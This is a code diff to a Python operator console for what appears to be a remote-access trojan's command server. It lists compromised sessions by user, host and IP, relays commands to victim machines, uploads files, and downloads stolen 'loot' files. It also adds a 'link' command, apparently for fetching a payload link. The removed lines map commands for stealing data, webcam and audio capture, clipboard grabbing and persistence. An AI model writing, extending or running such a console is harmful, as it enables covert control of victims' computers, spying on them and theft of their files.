@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import sys, os, json, time, argparse, urllib.request, base64
+import sys, os, json, time, argparse, urllib.request
 
 ap = argparse.ArgumentParser()
 ap.add_argument("--url", required=True)
@@ -25,6 +25,14 @@ def show():
         except Exception: pass
         time.sleep(0.4)
 
+def loot():
+    for f in json.loads(api("/api/loot")): print(f["id"], f["size"], f["name"])
+
+def dl(fid):
+    d = api("/api/loot/" + fid, raw=True)
+    p = os.path.expanduser("~/loot/" + fid + ".bin")
+    open(p, "wb").write(d); print("saved", p, len(d))
+
 def main():
     global cur, seq
     os.makedirs(os.path.expanduser("~/loot"), exist_ok=True)
@@ -41,40 +49,22 @@ def main():
                         print("%s %-6s %s@%s %s %s" % ("*" if s["on"] else "-", s["id"],
                               s["user"], s["host"], s["ip"], s["os"]))
                 elif c[0] == "in" and len(c) > 1: cur = c[1]; seq = 0
-                elif c[0] == "loot":
-                    for f in json.loads(api("/api/loot")): print(f["id"], f["size"], f["name"])
-                elif c[0] == "dl" and len(c) > 1:
-                    d = api("/api/loot/" + c[1], raw=True)
-                    p = os.path.expanduser("~/loot/" + c[1] + ".bin"); open(p, "wb").write(d)
-                    print("saved", p, len(d))
+                elif c[0] == "loot": loot()
+                elif c[0] == "dl" and len(c) > 1: dl(c[1])
+                elif c[0] == "link":
+                    print(api("/link"))
                 elif c[0] in ("q", "exit"): break
-                else: print("ls | in <id> | loot | dl <fid> | q")
+                else: print("ls | in <id> | loot | dl <fid> | link | q")
                 continue
-            if not line.startswith("."):
-                api("/api/cmd", json.dumps({"sid": cur, "cmd": line}).encode(),
-                    {"Content-Type": "application/json"})
-                continue
-            b = line[1:].split(None, 1); c = b[0]; a = b[1] if len(b) > 1 else ""
-            if c == "leave": cur = None
-            elif c == "get": api("/api/cmd", json.dumps({"sid": cur, "cmd": ".get " + a}).encode())
-            elif c == "shot": api("/api/cmd", json.dumps({"sid": cur, "cmd": ".shot"}).encode())
-            elif c == "put":
-                d = open(a, "rb").read()
+            if line.startswith(".put "):
+                a = line[6:]; d = open(a, "rb").read()
                 api("/api/put", d, {"X-Sid": cur, "X-Name": os.path.basename(a)})
                 print("sent", len(d), "bytes")
-            elif c == "loot":
-                for f in json.loads(api("/api/loot")): print(f["id"], f["size"], f["name"])
-            elif c == "dl" and a:
-                d = api("/api/loot/" + a, raw=True)
-                p = os.path.expanduser("~/loot/" + a + ".bin"); open(p, "wb").write(d); print("saved", p)
+            elif line == ".loot": loot()
+            elif line.startswith(".dl "): dl(line[4:])
             else:
-                m = {"leave": "", "cd": ".cd ", "ls": ".ls ", "steal": ".steal",
-                     "grab": ".grab ", "info": ".info", "ps": ".ps", "cam": ".cam",
-                     "audio": ".audio ", "persist": ".persist", "unpersist": ".unpersist",
-                     "sd": ".sd", "py": ".py ", "clip": ".clip "}
-                cmd = m.get(c)
-                if cmd is None: print("dot: leave cd ls get put shot steal grab info ps cam audio persist unpersist sd py clip loot dl")
-                else: api("/api/cmd", json.dumps({"sid": cur, "cmd": cmd + a}).encode())
+                api("/api/cmd", json.dumps({"sid": cur, "cmd": line}).encode())
+                if line == ".leave": cur = None
         except Exception as e:
             print("ERR", e)
 
